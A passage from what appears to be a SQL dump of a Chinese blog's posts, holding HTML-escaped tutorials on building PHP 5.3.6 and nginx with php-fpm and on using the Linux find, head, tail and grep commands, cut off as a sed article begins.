345 mysqld on&lt;/pre&gt;&lt;p&gt;&lt;span style=&quot;font-size:16px&quot;&gt;&lt;strong&gt;&lt;br /&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:16px&quot;&gt;&lt;strong&gt;安装PHP&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:16px&quot;&gt;&lt;span style=&quot;font-size:13px&quot;&gt;版本：5.3.6&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;tar -zxvf php-5.3.6.tar.gz\r\ncd php-5.3.6\r\n./configure --prefix=/usr/local/php  --with-config-file-path=/usr/local/php/etc   --with-mysql=/usr/local/mysql  --with-pdo-mysql=/usr/local/mysql   --with-mysqli=/usr/local/mysql/bin/mysql_config   --with-jpeg-dir   --with-png-dir   --with-zlib   --with-libxml-dir=/usr/lib   --enable-xml   --disable-rpath   --enable-safe-mode   --enable-bcmath   --enable-shmop   --enable-sysvsem   --enable-inline-optimization   --with-curl   --with-curlwrappers   --enable-mbregex   --enable-fpm   --enable-mbstring   --with-mcrypt   --with-gd  --with-freetype-dir=/usr/local/freetype  --enable-gd-native-ttf   --with-openssl   --with-mhash   --enable-pcntl   --enable-sockets   --with-xmlrpc   --enable-zip   --enable-soap   --without-pear \r\nmake &amp;amp;&amp;amp; make install&lt;/pre&gt;&lt;p&gt;安装完成之后配置PHP，包括php.ini, php-fpm.conf等&lt;/p&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;cp php.ini-production /usr/local/php/etc/php.ini\r\nln -s /usr/local/php/sbin/php-fpm /etc/init.d/\r\ncp /usr/local/php/etc/php-fpm.conf-default /usr/local/php/etc/php-fpm.conf&lt;/pre&gt;&lt;p&gt;最后修改php.ini和php-fpm.conf配置项&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:16px&quot;&gt;&lt;strong&gt;安装nginx&lt;/strong&gt;&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;版本：1.0.13&lt;/p&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;tar -zxvf nginx-1.0.13.tar.gz\r\ncd nginx-1.0.13\r\n./configure --prefix=/usr/local/nginx --with-http_ssl_module --with-http_gzip_static_module\r\nmake &amp;amp;&amp;amp; make install&lt;/pre&gt;&lt;p&gt;安装完成之后修改/usr/local/nginx/conf/nginx.conf配置文件&lt;/p&gt;&lt;p&gt;打开nginx.conf文件，找到&lt;/p&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;location ~ .php$ {\r\n    root           html;\r\n    fastcgi_pass   127.0.0.1:9000;\r\n    fastcgi_index  index.php;\r\n    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;\r\n    include        fastcgi_params;\r\n}&lt;/pre&gt;&lt;p&gt;将前面的#去掉&lt;/p&gt;&lt;p&gt;location 定义文件类型, .php$ 代表所有以 php 作为文件后缀的文件类型.&lt;br /&gt;&lt;/p&gt;&lt;p&gt;root 定义php项目文件的物理路径，例如：将html修改为/usr/local/website&lt;/p&gt;&lt;p&gt;fastcgi_index 定义 php 文件类型中的默认索引页&lt;/p&gt;&lt;p&gt;fastcgi_param SCRIPT_FILENAME 定义了页面请求参数, 如客户端需要访问 /t1.php 则会自动读取 /www/t1.php文件, 如客户端访问 / 则自动读取 /www/index.php 文件，/scripts需要改为php项目文件的物理路径&lt;/p&gt;&lt;p&gt;include 定义fastcgi 配置信息将会被保存到 /usr/local/nginx/conf/fastcgi_params 文件中&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:16px&quot;&gt;&lt;strong&gt;配置php-fpm的启动、停止、重启shell&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;vi /sbin/php-fpm&lt;/pre&gt;&lt;p&gt;输入以下内容并保存退出&lt;/p&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;#! /bin/sh\r\n                                                                                                                                                                                                                                                 \r\nstart () {\r\n    /usr/local/php/sbin/php-fpm -c /usr/local/php/etc/php.ini -y /usr/local/php/etc/php-fpm.conf\r\n    echo &#039;success:php-fpm start!&#039;\r\n    exit 0\r\n}\r\n                                                                                                                                                                                                                                                 \r\nstop () {\r\n    kill -INT `cat /usr/local/php/var/run/php-fpm.pid`\r\n    echo &#039;success:php-fpm stop!&#039;\r\n    exit 0\r\n}\r\n                                                                                                                                                                                                                                                 \r\nrestart () {\r\n    kill -USR2 `cat /usr/local/php/var/run/php-fpm.pid`\r\n    echo &#039;success:php-fpm restart!&#039;\r\n    exit 0\r\n}\r\n                                                                                                                                                                                                                                                 \r\ncase $1 in\r\n    start)   start\r\n    ;;\r\n    stop)    stop\r\n    ;;\r\n    restart) restart\r\n    ;;\r\nesac&lt;/pre&gt;&lt;p&gt;更改执行权限&lt;br /&gt;&lt;/p&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;chmod +x /sbin/php-fpm&lt;/pre&gt;&lt;p&gt;现在我们可以直接在terminal中操作php-fpm&lt;/p&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;php-fpm start\r\nphp-fpm restart\r\nphp-fpm stop&lt;/pre&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1387348089),
(34, 34, '&lt;p&gt;&lt;a target=&quot;_blank&quot; href=&quot;http://baike.baidu.com/view/801452.htm&quot;&gt;百度百科&lt;/a&gt;：find是linux 命令，它将档案系统内符合 expression 的档案列出来。你可以指定档案的名称、类别、时间、大小、权限等不同选项的组合，只有完全相符的才会被列出来。find 根据下列规则判断 path 和 expression，在命令列上第一个 - ( ) , ! 之前的部分为 path，之后的是 expression。&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:16px&quot;&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;命令格式&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;find pathname -options [-print -exec -ok ...]\r\n&amp;lt;code&amp;gt;pathname: find命令所查找的目录路径。例如用.来表示当前目录，用/来表示系统根目录。\r\n-options: 可选的命令项\r\n-print: find命令将匹配的文件输出到标准输出。\r\n-exec: find命令对匹配的文件执行该参数所给出的shell命令。相应命令的形式为command {} ;注意{}和;之间的空格。\r\n-ok: 和-exec的作用相同，只不过以一种更为安全的模式来执行该参数所给出的shell命令，在执行每一个命令之前，都会给出提示，让用户来确定是否执行。&amp;lt;/code&amp;gt;&lt;/pre&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:16px&quot;&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;options命令项&lt;/span&gt;&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;-name: &amp;nbsp;按照文件名查找文件。&lt;br /&gt;-perm: &amp;nbsp; 按照文件权限来查找文件。&lt;br /&gt;-prune: &amp;nbsp;使用这一选项可以使find命令不在当前指定的目录中查找，如果同时使用-depth选项，那么-prune将被find命令忽略。&lt;br /&gt;-user: &amp;nbsp; &amp;nbsp;按照文件属主来查找文件。&lt;br /&gt;-group: &amp;nbsp;按照文件所属的组来查找文件。&lt;br /&gt;-mtime -n +n: 按照文件的更改时间来查找文件，-n表示文件更改时间距现在n天以内，+n表示文件更改时间距现在n天以前。find命令还有-atime和-ctime 选项，它们跟-mtime选项类似。&lt;br /&gt;-nogroup: 查找无有效所属组的文件，即该文件所属的组在/etc/groups中不存在。&lt;br /&gt;-nouser: 查找无有效属主的文件，即该文件的属主在/etc/passwd中不存在。&lt;br /&gt;-newer file1 ! file2: 查找更改时间比文件file1新但比文件file2旧的文件。&lt;br /&gt;&lt;span style=&quot;color:#339999&quot;&gt;-type: 查找某一类型的文件，诸如&lt;br /&gt;b - 块设备文件&lt;br /&gt;d - 目录&lt;br /&gt;c - 字符设备文件&lt;br /&gt;p - 管道文件&lt;br /&gt;l - 符号链接文件&lt;br /&gt;f - 普通文件&lt;/span&gt;&lt;br /&gt;-size n:[c] 查找文件长度为n块的文件，带有c时表示文件长度以字节计&lt;br /&gt;&lt;/p&gt;&lt;p&gt;-depth: 在查找文件时，首先查找当前目录中的文件，然后再在其子目录中查找&lt;/p&gt;&lt;p&gt;-maxdepth: 设置要查找的最大目录层级&lt;/p&gt;&lt;p&gt;-mindepth: 设置要查找的最小目录层级&lt;br /&gt;&lt;/p&gt;&lt;p&gt;-fstype: 查找位于某一类型文件系统中的文件，这些文件系统类型通常可以在配置文件/etc/fstab中找到，该配置文件中包含了本系统中有关文件系统的信息&lt;/p&gt;&lt;p&gt;-mount: 在查找文件时不跨越文件系统mount点&lt;/p&gt;&lt;p&gt;-follow: 如果find命令遇到符号链接文件，就跟踪至链接所指向的文件&lt;/p&gt;&lt;p&gt;-cpio: 对匹配的文件使用cpio命令，将这些文件备份到磁带设备中&lt;br /&gt;&lt;/p&gt;&lt;p&gt;-ls: 如果匹配到文件或目录，则将文件或目录详细信息打印到输出设备&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;关于amin, atime, cmin, ctime, mmin, mtime等的特别说明&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;-amin n: 查找系统中最后N分钟访问的文件&lt;br /&gt;-atime n: 查找系统中最后n*24小时访问的文件&lt;br /&gt;-cmin n: 查找系统中最后N分钟被改变文件状态的文件&lt;br /&gt;-ctime n: 查找系统中最后n*24小时被改变文件状态的文件&lt;br /&gt;-mmin n: 查找系统中最后N分钟被改变文件数据的文件&lt;br /&gt;-mtime n: 查找系统中最后n*24小时被改变文件数据的文件&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:16px&quot;&gt;&lt;strong&gt;-print, -exec, -ok命令项执行shell&lt;/strong&gt;&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;使用这三个命令项可以用来执行在find命令中执行shell。&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;&lt;span style=&quot;color:#339999&quot;&gt;-print&lt;/span&gt;&lt;/span&gt;默认命令项，将匹配的文件输出到标准输出端&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#339999&quot;&gt;-exec&lt;/span&gt;执行shell命令，格式 -exec command {} ; ，将匹配的文件执行command命令&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#339999&quot;&gt;-ok&lt;/span&gt;作用同-exec，额外会提示用户是否确认执行该shell命令&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;例子：&lt;/span&gt;&lt;/p&gt;&lt;p&gt;查找根目录下的所有php.ini文件并打印到终端输出&lt;/p&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;find / -name php.ini -exec ls -1 {} ;&lt;/pre&gt;&lt;p&gt;查找/var/log目录中更改时间在五日以前的文件并删除&lt;/p&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;find /var/log -type f -mtime +5 -ok rm -rf {} ;&lt;/pre&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;说明：用-ok命令项，系统会提示我们是否确认执行该操作(删除)，可以防止误删重要文件&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;查找/usr/local/php目录下的php.ini文件并匹配文件内容的extension字符串&lt;/p&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;find /usr/local/php -name php.ini -exec grep extension {} ;&lt;/pre&gt;&lt;p&gt;&lt;br /&gt;&lt;span style=&quot;font-size:16px&quot;&gt;&lt;strong&gt;find命令综合使用&lt;/strong&gt;&lt;/span&gt;&lt;br /&gt;在/usr/local/php目录下查找php.ini并为其添加所有用户的写权限&lt;/p&gt;&lt;pre class=&quot;brush:ps;toolbar:false;&quot;&gt;find /usr/local/php -name php.ini -exec chmod a+w {} ;&lt;/pre&gt;&lt;p&gt;在/usr/local目录下查找所有属于root组并以.conf为扩展名的文件&lt;/p&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;find /usr/local -group root -name *.conf -exec ls -1 {} ;&lt;/pre&gt;&lt;p&gt;在/usr/local目录下查找所有大小为0的文件&lt;/p&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;find /usr/local -size 0 -exec ls -1 {} ;&lt;/pre&gt;&lt;p&gt;在/usr/local/php目录下查找php.ini，但避开/usr/local/php/etc目录&lt;/p&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;find /usr/local/php -path /usr/local/php/etc -prune -name php.ini -exec ls -1 {} ;&lt;/pre&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:16px&quot;&gt;&lt;strong&gt;find | xargs命令综合使用&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;find命令把匹配到的文件传递给xargs命令，而xargs命令每次只获取一部分文件而不是全部，不像-exec选项那样。这样它可以先处理最先获取的一部分文件，然后是下一批，并如此继续下去。&lt;/p&gt;&lt;p&gt;在有些系统中，使用-exec选项会为处理每一个匹配到的文件而发起一个相应的进程，并非将匹配到的文件全部作为参数一次执行；这样在有些情况下就会出现进程过多，系统性能下降的问题，因而效率不高；&lt;/p&gt;&lt;p&gt;而使用xargs命令则只有一个进程。另外，在使用xargs命令时，究竟是一次获取所有的参数，还是分批取得参数，以及每一次获取参数的数目都会根据该命令的选项及系统内核中相应的可调参数来确定。&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;例子：&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;在/usr/local目录下查找php.ini并为其加写权限&lt;/p&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;find /usr/local -name php.ini | xargs chmod +w&lt;/pre&gt;&lt;p&gt;在/usr/local/webserver/site/laugh项目下查找所有.html文件并打印到终端输出&lt;/p&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;find /usr/local/webserver/site/laugh -name *.html | xargs ls -1&lt;/pre&gt;&lt;p&gt;在/usr/local目录下查找内存信息转储文件(core dump) ，然后把结果保存到/tmp/core.log文件中&lt;/p&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;find /usr/local -name &#039;core&#039; | xargs echo &quot;&quot; &amp;gt; /tmp/core.log\r\ncat /tmp/core.log&lt;/pre&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;参考文章：&lt;/p&gt;&lt;p&gt;&lt;a target=&quot;_blank&quot; href=&quot;http://www.linuxsir.org/main/?q=node/137&quot;&gt;http://www.linuxsir.org/main/?q=node/137&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1387347927),
(35, 35, '&lt;p&gt;&lt;a target=&quot;_blank&quot; href=&quot;http://baike.baidu.com/view/1053222.htm&quot;&gt;百度百科&lt;/a&gt;&lt;/p&gt;&lt;p style=&quot;color:#cc0000&quot;&gt;head: 从档案开始位置读取指定长度的文字显示到终端输出&lt;/p&gt;&lt;p style=&quot;color:#339999&quot;&gt;命令格式：head -options file&lt;/p&gt;&lt;p style=&quot;font-weight:bold&quot;&gt;&lt;span style=&quot;font-size:16px&quot;&gt;options命令项&lt;/span&gt;&lt;/p&gt;&lt;p&gt;-c: 要读取的文字长度，字节(bytes)&lt;/p&gt;&lt;p&gt;-n: 要读取的文字行数，行(lines)&lt;/p&gt;&lt;p&gt;-v: 在输出区开始打印文件路径和名称信息(==&amp;gt; /usr/local/php/etc/php.ini &amp;lt;==)&lt;br /&gt;&lt;/p&gt;&lt;p&gt;-q: 不打印指定文件的路径和名称信息&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;例子：&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;打印php.ini文件的前100个字符&lt;/p&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;head -c 100 /usr/local/php/etc/php.ini&lt;/pre&gt;&lt;p&gt;打印php.ini文件的开始10行内容&lt;/p&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;head -n 10 /usr/local/php/etc/php.ini&lt;/pre&gt;&lt;p&gt;打印php.ini文件的开始10行内容并在输出区开始显示文件信息&lt;/p&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;head -n 10 -v /usr/local/php/etc/php.ini&lt;/pre&gt;&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;tail: 从档案结尾位置读取指定长度的文字显示到终端输出&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#339999&quot;&gt;命令格式：tail -options file&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:16px;font-weight:bold&quot;&gt;options命令项&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;-c: 要读取的文字长度，字节(bytes)&lt;/p&gt;&lt;p&gt;-n: 要读取的文字行数，行(lines)&lt;/p&gt;&lt;p&gt;-f: 持续实时打印文件结尾信息，可以用来查看日志(log)文件的更新过程&lt;/p&gt;&lt;p&gt;-v: 在输出区开始打印文件路径和名称信息(==&amp;gt; /usr/local/php/etc/php.ini &amp;lt;==)&lt;br /&gt;&lt;/p&gt;&lt;p&gt;-q: 不打印指定文件的路径和名称信息&lt;/p&gt;&lt;p&gt;-s: 同-f一起使用，可以暂停/休眠信息输出n秒&lt;/p&gt;&lt;p style=&quot;color:#cc0000&quot;&gt;例子：&lt;/p&gt;&lt;p&gt;监视syslog文件的日志信息，持续读取结尾3行打印到终端输出，并每打印一次休息1秒&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;tail -n 3 -v -f -s 1 /var/log/syslog&lt;/pre&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1387347900),
(36, 36, '&lt;p&gt;&lt;a target=&quot;_blank&quot; href=&quot;http://baike.baidu.com/view/1057278.htm&quot;&gt;百度百科&lt;/a&gt;：grep （global search regular expression(RE) and print out the line,全面搜索正则表达式并把行打印出来）是一种强大的文本搜索工具，它能&lt;a target=&quot;_blank&quot; href=&quot;http://baike.baidu.com/view/1091115.htm&quot;&gt;使用正则表达式&lt;/a&gt;搜索文本，并把匹配的行打印出来。Unix的grep家族包括grep、egrep和fgrep。&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;命令格式：grep -options pattern file&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:16px&quot;&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;options命令项&lt;/span&gt;&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;-a: 不要忽略二进制数据&lt;/p&gt;&lt;p&gt;-A&amp;lt;n&amp;gt;: 额外显示匹配到的内容行的其后几行的内容&lt;/p&gt;&lt;p&gt;-b: 在显示匹配到的内容行之前，打印该行第一个字符的位置偏移量&lt;/p&gt;&lt;p&gt;-A&amp;lt;n&amp;gt;: 额外显示匹配到的内容行的之前几行的内容&lt;/p&gt;&lt;p&gt;-c: 计算匹配行的数目&lt;/p&gt;&lt;p&gt;-C: 额外显示匹配到的内容行的之前和其后几行的内容&lt;/p&gt;&lt;p&gt;-d&amp;lt;read,recurse,skip&amp;gt;: 查找的file为目录时需要指定该参数&lt;/p&gt;&lt;p&gt;-e: 指定字符串做为查找文件内容的范本样式&lt;/p&gt;&lt;p&gt;-E: 将范本样式为延伸的普通表示法来使用&lt;/p&gt;&lt;p&gt;-f: 指定范本文件，其内容含有一个或多个范本样式，让grep查找符合范本条件的文件内容，格式为每行一个范本样式&lt;/p&gt;&lt;p&gt;-F: 将范本样式视为固定字符串的列表&lt;/p&gt;&lt;p&gt;-G: 将范本样式视为普通的表示法来使用&lt;/p&gt;&lt;p&gt;-h: 在显示符合范本样式的那一行之前，不标示该行所属的文件名称&lt;/p&gt;&lt;p&gt;-H: 在显示符合范本样式的那一行之前，表示该行所属的文件名称&lt;/p&gt;&lt;p&gt;-i: 忽略字符大小写的差别&lt;/p&gt;&lt;p&gt;-l: 列出文件内容符合指定的范本样式的文件名称&lt;/p&gt;&lt;p&gt;-L: 列出文件内容不符合指定的范本样式的文件名称&lt;/p&gt;&lt;p&gt;-n: 在显示符合范本样式的那一行之前，标示出该行的行数编号&lt;/p&gt;&lt;p&gt;-q: 不显示任何信息&lt;/p&gt;&lt;p&gt;-r: 此参数的效果和指定&ldquo;-d recurse&rdquo;参数相同&lt;/p&gt;&lt;p&gt;-s: 不显示错误信息&lt;/p&gt;&lt;p&gt;-v: 反转查找&lt;/p&gt;&lt;p&gt;-V: 显示版本信息&lt;/p&gt;&lt;p&gt;-w: 只显示全字符合的列&lt;/p&gt;&lt;p&gt;-x: 只显示全列符合的列&lt;/p&gt;&lt;p&gt;-y: 此参数的效果和指定&ldquo;-i&rdquo;参数相同&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;例子：&lt;/span&gt;&lt;/p&gt;&lt;p&gt;查找php.ini文件中出现fastcgi的行并打印其行信息和该行第一个字符的位置偏移量&lt;/p&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;grep -n -b fastcgi /usr/local/php/etc/php.ini&lt;/pre&gt;&lt;p&gt;计算php.ini文件中出现fastcgi的次数&lt;/p&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;grep -c fastcgi /usr/local/php/etc/php.ini&lt;/pre&gt;&lt;p&gt;计算/usr/local/php/etc目录下的所有文件内出现.so的次数&lt;/p&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;grep -c -d recurse .so /usr/local/php/etc&lt;/pre&gt;&lt;p&gt;&lt;br /&gt;&lt;span style=&quot;font-size:16px&quot;&gt;&lt;strong&gt;正则表达式元字符集&lt;/strong&gt;&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;^ &amp;nbsp; &amp;nbsp;匹配行的开始 如：&amp;#39;^grep&amp;#39;匹配所有以grep开头的行&lt;br /&gt;&lt;/p&gt;&lt;p&gt;$ &amp;nbsp; 匹配行的结束 如：&amp;#39;grep$&amp;#39;匹配所有以grep结尾的行&lt;br /&gt;&lt;/p&gt;&lt;p&gt;. &amp;nbsp; &amp;nbsp;匹配一个非换行符的字符 如：&amp;#39;gr.p&amp;#39;匹配gr跟p中间为任意字符的字符串，如grep, grap, grop等&lt;br /&gt;&lt;/p&gt;&lt;p&gt;* &amp;nbsp; &amp;nbsp;匹配零次或多次先前字符 如：&amp;#39;mysql[nd]*&amp;#39;匹配所有mysql开始后面跟零个或多个nd的字符串 .*一起用代表任意字符&lt;br /&gt;&lt;/p&gt;&lt;p&gt;[] &amp;nbsp; &amp;nbsp;匹配一个指定范围内的字符，如&amp;#39;[Gg]rep&amp;#39;匹配Grep和grep&lt;/p&gt;&lt;p&gt;[^] &amp;nbsp; &amp;nbsp; 匹配一个不在指定范围内的字符，如：&amp;#39;[^A-FH-Z]rep&amp;#39;匹配不包含A-F和H-Z的一个字母开头，紧跟rep的行&lt;br /&gt;&lt;/p&gt;&lt;p&gt;(..) &amp;nbsp; &amp;nbsp;标记匹配字符，如&amp;#39;(love)&amp;#39;，love被标记为1&lt;/p&gt;&lt;p&gt;&amp;lt; &amp;nbsp; &amp;nbsp; &amp;nbsp;匹配单词的开始，如&amp;lt;fast匹配以fast开始的单词的行&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&amp;gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;匹配单词的结束，如grep&amp;gt;匹配包含以grep结尾的单词的行&lt;/p&gt;&lt;p&gt;x{m} &amp;nbsp; &amp;nbsp; 重复字符x，m次，如：&amp;#39;o{5}&amp;#39;匹配包含5个o的行&lt;/p&gt;&lt;p&gt;x{m,} &amp;nbsp; &amp;nbsp;重复字符x,至少m次，如：&amp;#39;o{5,}&amp;#39;匹配至少有5个o的行&lt;/p&gt;&lt;p&gt;x{m,n} &amp;nbsp;重复字符x，至少m次，不多于n次，如：&amp;#39;o{5,10}&amp;#39;匹配5--10个o的行&lt;/p&gt;&lt;p&gt;w &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 匹配文字和数字字符，也就是[A-Za-z0-9]，如：&amp;#39;Gw*p&amp;#39;匹配以G开始，p结尾，中间有零个或多个文字或数字字符&lt;/p&gt;&lt;p&gt;W &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;w的反置形式，匹配一个或多个非单词字符，如点号句号等&lt;/p&gt;&lt;p&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 单词锁定符，如: &amp;#39;grep&amp;#39;只匹配grep&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;egrep和 grep -E的元字符扩展集&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;+ &amp;nbsp; &amp;nbsp;匹配零次或多次先前字符 如：&amp;#39;[a-z]+able&amp;#39;，匹配一个或多个小写字母后跟able的串，如loveable,enable,disable等&lt;/p&gt;&lt;p&gt;? &amp;nbsp; &amp;nbsp;匹配零个或一个先前的字符 如：&amp;#39;gr?p&amp;#39;匹配gr后跟一个或没有字符，然后是p的行&lt;/p&gt;&lt;p&gt;| &amp;nbsp; &amp;nbsp; 匹配多个元素其中之一的字符 如: a|b|c匹配a或b或c&lt;/p&gt;&lt;p&gt;() &amp;nbsp; &amp;nbsp;分组符号，如：love(able|rs)ov+匹配loveable或lovers，匹配一个或多个ov&lt;/p&gt;&lt;p&gt;x{m},x{m,},x{m,n}作用同x{m},x{m,},x{m,n}&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;注意&lt;/span&gt;：在有些机器上需要加-E选项才能进行正则匹配 如：grep a|b -E&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;例子：&lt;/span&gt;&lt;/p&gt;&lt;p&gt;在php.ini中查询有两个ss的单词的数量&lt;/p&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;grep -c -E &#039;s{2}&#039; /usr/local/php/etc/php.ini&lt;/pre&gt;&lt;p&gt;在php.ini中查询出现disable或者enable的次数，并不区分大小写&lt;/p&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;grep -c -i -E &#039;(dis|en)able&#039; /usr/local/php/etc/php.ini&lt;/pre&gt;&lt;p&gt;在php.ini中查询出现带ll的单词的次数，但不统计带dll的单词&lt;/p&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;grep -c -i -E &#039;[^d]l{2}&#039; /usr/local/php/etc/php.ini&lt;/pre&gt;&lt;p&gt;在php.ini中查询以dll结尾的行数&lt;/p&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;grep -c -i -E &#039;dl{2}$&#039; /usr/local/php/etc/php.ini&lt;/pre&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1387347886),
(37, 37, '&lt;p&gt;&lt;span style=&quot;font-size:16px&quot;&gt;&lt;strong&gt;Sed简介&lt;/strong&gt;&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;sed 是一种在线编辑器，它一次处理一行内容。处理时，把当前处理的行存储在临时缓冲区中，称为&ldquo;模式空间&rdquo;（pattern space），接着用sed命令处理缓冲区中的内容，处理完成后，把缓冲区的内容送往屏幕。接着处理下一行，这样不断重复，直到文件末尾。文件内容并没有 改变，除非你使用重定向存储输出。Sed主要用来自动编辑一个或多个文件；简化对文件的反复操作；编写转换程序等。&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;命令格式：sed -options script file 或 sed -options -f scriptfile file&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p style=&quot;background-color:#ffffff&quot;&gt;&lt;span style=&quot;color:#339999&quot;&gt;系统：Ubuntu11.10&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#339999;background-color:#ffffff&quot;&gt;sed：GNU sed version 4.2.1&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:16px&quot;&gt;&lt;strong&gt;options命令项&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;-n &amp;nbsp; 关闭自动输出模式空间的内容&lt;br 